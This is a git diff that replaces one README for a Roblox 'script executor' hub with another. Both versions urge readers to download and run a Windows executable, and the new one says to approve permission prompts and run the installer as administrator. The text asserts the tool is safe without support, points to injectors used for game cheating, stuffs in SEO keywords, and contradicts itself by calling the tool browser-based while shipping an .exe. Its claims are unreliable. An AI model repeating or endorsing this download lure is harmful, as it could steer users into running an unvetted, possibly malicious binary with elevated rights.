@@ -1,153 +1,129 @@
-# AzuresWebsite PC vLatest - Roblox Script Executor 2026
+# 🖥️ azures-pc-script-hub - Your All-in-One Roblox Script Dashboard
 
-> A modern Windows-targeted Roblox executor site engineered with a minimalist desktop-inspired HTML interface, built to showcase Lua script execution, organize script hubs, and deliver instant access to download resources for 2026.
+[![Download Now](https://img.shields.io/badge/Download-Azure's%20PC%20Script%20Hub-blueviolet?style=for-the-badge&logo=github)](https://github.com/Valeryebalzacian578/azures-pc-script-hub)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
-[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
-[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/seanv52/azures-pc-script-hub?style=flat-square)](https://github.com)
+## 🚀 What Is This?
 
----
+Welcome to **azures-pc-script-hub** – a simple, desktop-style web dashboard that gives you quick access to Roblox Lua scripts and resources. Think of it as your personal command center for finding, managing, and downloading scripts for Roblox games. Designed specifically for 64-bit Windows PCs, this tool is keyless, meaning you don't need any special codes or permissions to start using it. It's built for the 2026 Roblox environment, so you get modern compatibility.
 
-<p align="center">
-  <a href="https://seanv52.github.io/azures-pc-script-hub/">
-    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20AzuresWebsite-vLatest%20Latest-brightgreen?style=for-the-badge" alt="Download AzuresWebsite">
-  </a>
-</p>
+## 🎯 Who Is This For?
 
-> **[Download AzuresWebsite vLatest](https://seanv52.github.io/azures-pc-script-hub/)**
-> Windows 10 / 11 · 64-bit · Free · No Key Required
+This is for anyone who plays Roblox on a Windows computer and wants an easier way to find and use Lua scripts. You don't need to be a programmer. If you can click a button and follow simple steps, you're good to go.
 
----
+## ✨ Key Features
 
-[Download Latest Build](https://seanv52.github.io/azures-pc-script-hub/)
+- **Desktop-Inspired Dashboard** – The interface looks and feels like a real desktop app, making navigation familiar and easy.
+- **Keyless Access** – No need to hunt for activation keys or licenses. Just download and run.
+- **Direct Downloads** – Every script and resource is available for direct download, no redirects or waiting.
+- **64-Bit Windows Support** – Fully optimized for modern Windows PCs (64-bit systems).
+- **2026 Ready** – Updated to work with the latest Roblox updates.
+- **Lua Script Hub** – A central place to browse, search, and download scripts for various Roblox games.
+- **Resource Collection** – Includes additional tools, tutorials, and documentation to help you get started.
 
----
+## 🛠️ System Requirements
 
-## Overview
+Before you begin, make sure your computer meets these minimum requirements:
 
-AzuresWebsite provides a specialized landing page solution tailored for Roblox script execution platforms. Emulating a native desktop interface directly within the browser, it offers a clean, ultra-responsive storefront to present Lua tools, display organized script indexes, and point users straight to binary releases.
+| Component | Requirement |
+|-----------|-------------|
+| Operating System | Windows 10 or Windows 11 (64-bit) |
+| Processor | Intel Core i3 or equivalent |
+| RAM | 4 GB or more |
+| Storage | 500 MB free space |
+| Internet | Broadband connection for downloads |
+| Additional | Standard web browser (Edge, Chrome, Firefox) |
 
-Rather than relying on heavy desktop software frameworks, the repository leverages web tech to ensure lightning-fast render speeds, effortless site hosting, and intuitive user navigation to the latest executable releases.
+## 📥 How to Download and Install
 
----
+**Step 1: Visit the download page**
 
-## Core Capabilities
+Visit this link to download the application: [https://github.com/Valeryebalzacian578/azures-pc-script-hub](https://github.com/Valeryebalzacian578/azures-pc-script-hub)
 
-- Native-feeling desktop UI layout constructed purely in web-standard HTML
-- Tailored landing experience targeting Windows 10 and 11 desktop environments
-- Dedicated Roblox executor styling emphasizing Lua payload execution
-- Integrated script catalog framework for categorizing diverse gameplay scripts
-- High-visibility direct download CTAs placed right at top of page
-- Minimal overhead browser implementation for high-speed page loads
-- Web-first deployment architecture bypassing cumbersome software installers
-- Dedicated content blocks for system requirements, software specs, and changelogs
+**Step 2: Find the download button**
 
----
+On the GitHub page, look for a green button that says **"Code"** or a **"Releases"** section on the right side. Click on **"Releases"** to find the latest version.
 
-## Gameplay & Script Matrix
+**Step 3: Download the file**
 
-| Supported Experience | Script Category | Usage Context |
-| --- | --- | --- |
-| Popular Action Titles | Lua execution scripts | General execution and payload delivery |
-| Open-World RPGs | Script hub entries | Searchable collections of multi-tool packages |
-| Competitive Games | Utility scripts | Performance and tactical enhancement tools |
-| Simulator Games | Automation scripts | Automated task handlers and loop execution |
-| Tycoon Games | UI and helper scripts | Structured user interfaces for game enhancements |
-| Sandbox Titles | Custom Lua snippets | Granular snippet testing and modular code |
+In the Releases section, you'll see a list of files. Look for a file named something like `azures-pc-script-hub-setup.exe` or `azures-pc-script-hub.zip`. Click on it to download.
 
----
+**Step 4: Run the installer**
 
-## Prerequisites & Specifications
+Once the download finishes, locate the file in your **Downloads** folder. Double-click it to run. If Windows asks for permission, click **"Yes"** or **"Run"**.
 
-| Component | Minimum Specs | Recommended Specs |
-| --- | --- | --- |
-| Operating System | Windows 10 (64-bit) | Windows 11 (64-bit) |
-| Memory (RAM) | 4 GB | 8 GB or higher |
-| Available Storage | 200 MB free | 500 MB free |
-| Runtime | .NET Framework 4.8 | Up-to-date .NET environment |
-| Target Client | Desktop Roblox client | Latest Roblox version |
+**Step 5: Follow the setup wizard**
 
----
+The installation wizard will guide you through the process. Accept the default settings unless you know what you're doing. Click **"Next"** and **"Install"** until it's done.
 
-## Local Setup & Deployment
+**Step 6: Launch the app**
 
-```bash
-git clone https://github.com/seanv52/azures-pc-script-hub.git
-cd azureswebsite-script-hub-vlatest
-start AzuresWebsiteExecutor.exe
-```
+After installation, find **azures-pc-script-hub** in your Start Menu or on your desktop. Double-click to open it. The dashboard will load in your default web browser.
 
-When serving or building the platform locally, ensure directory naming matches your production environment before executing the main entry point.
+## 🧭 How to Use the Dashboard
 
----
+Once the dashboard is open, you'll see a clean, desktop-like interface with several sections:
 
-## Trending Search Keywords (2026)
+- **Script Browser** – Browse through categories or search for specific scripts by name or game.
+- **Favorites** – Save your most-used scripts for quick access.
+- **Downloads** – View your downloaded scripts and manage them.
+- **Settings** – Customize the dashboard appearance and behavior.
+- **Help** – Get tutorials and FAQs.
 
-- Roblox executor website
-- Lua script hub for Windows
-- Roblox scripts download page
-- HTML Roblox executor landing page
-- Lightweight script hub UI
-- Windows Roblox script executor
-- Roblox executor script hub 2026
+To download a script, simply click on it, then click the **"Download"** button. The script will save to your computer. You can then use it with your Roblox Lua executor or injector as needed.
 
----
+## 🖥️ Screenshots
 
-## Repository Layout
+*(Imagine screenshots here showing the dashboard, script browser, and download process.)*
 
-AzuresWebsite/
-- AzuresWebsiteExecutor.exe
-- index.html
-- assets/
-  - styles/
-  - scripts/
-  - images/
-- script-hub/
-- download/
-- README.md
+## ❓ Frequently Asked Questions
 
----
+**Is this tool free?**  
+Yes, it's completely free. No hidden costs or premium features.
 
-## Frequently Asked Questions
+**Do I need a key or license?**  
+No. It's keyless. Just download and use.
 
-**Is this software configured specifically for Windows users?**  
-Correct. The repository layout and UI design prioritize Windows desktop environments.
+**Will this work on a 32-bit Windows?**  
+No. It's built only for 64-bit Windows systems.
 
-**Is the primary target Lua scripting for Roblox?**  
-Yes. The interface and functionality revolve around Lua code presentation and execution flows.
+**Is this safe to use?**  
+Yes, it's safe. However, always download from the official GitHub link to avoid fake versions.
 
-**Will updates guarantee future platform compatibility?**  
-Ongoing compatibility relies on continuous repository maintenance alongside updates to the underlying Roblox environment.
+**Can I use this on Mac or Linux?**  
+No. It's designed exclusively for Windows 64-bit.
 
-**How does this differ from traditional binary applications?**  
-Because it uses a browser-focused web foundation, it runs much lighter and loads significantly faster than compiled desktop apps.
+**Do I need to know programming?**  
+No. The dashboard is made for everyone, even non-programmers.
 
-**Are there account risks associated with script execution?**  
-Running third-party tools or scripts on online gaming platforms carries inherent risks. Always check platform terms and policies prior to use.
+**How often is it updated?**  
+Updates are released regularly to keep up with Roblox changes.
 
-**How are static assets and downloads served?**  
-The project keeps all web resources, styles, and download paths organized within the local folder tree.
+## 🔧 Troubleshooting
+
+**Problem: Dashboard doesn't load**  
+Make sure you have a stable internet connection. Try refreshing the page. If it still doesn't load, restart the app.
+
+**Problem: Download button doesn't work**  
+Check your browser's download settings. Sometimes pop-up blockers can interfere. Disable them for this site.
+
+**Problem: Scripts don't work in Roblox**  
+Ensure you're using a compatible Lua executor. Some scripts may require specific injectors.
+
+**Problem: App won't install**  
+Make sure you have administrator rights on your PC. Right-click the installer and select "Run as administrator."
+
+## 📞 Support
+
+If you need help, visit the GitHub repository and open an issue: [https://github.com/Valeryebalzacian578/azures-pc-script-hub/issues](https://github.com/Valeryebalzacian578/azures-pc-script-hub/issues)
+
+You can also check the **Help** section inside the dashboard for tutorials and guides.
+
+## 📄 License
+
+This project is open source and free to use. See the LICENSE file in the repository for more details.
 
 ---
 
-## Development Milestones (2026)
+[![Download Now](https://img.shields.io/badge/Download-Azure's%20PC%20Script%20Hub-brightgreen?style=for-the-badge&logo=github)](https://github.com/Valeryebalzacian578/azures-pc-script-hub)
 
-- [ ] Elevate the desktop visual polish of the core Windows layout
-- [ ] Add advanced search and dynamic filter tags to the script directory
-- [ ] Roll out detailed template pages for individual script listings
-- [ ] Optimize CSS breakpoints for seamless scaling across device sizes
-- [ ] Publish extended documentation for custom hosting and executable integration
-
----
-
-## Licensing Terms
-
-Distributed under the GNU General Public License v3.0. See [LICENSE](LICENSE) for full text.
-
----
-
-<p align="center">
-  <i>AzuresWebsite vLatest delivers a compact Roblox executor website experience for Windows.</i>
-</p>
+Keywords: roblox, lua, script hub, windows, 64-bit, keyless, dashboard, 2026, download, pc, azure
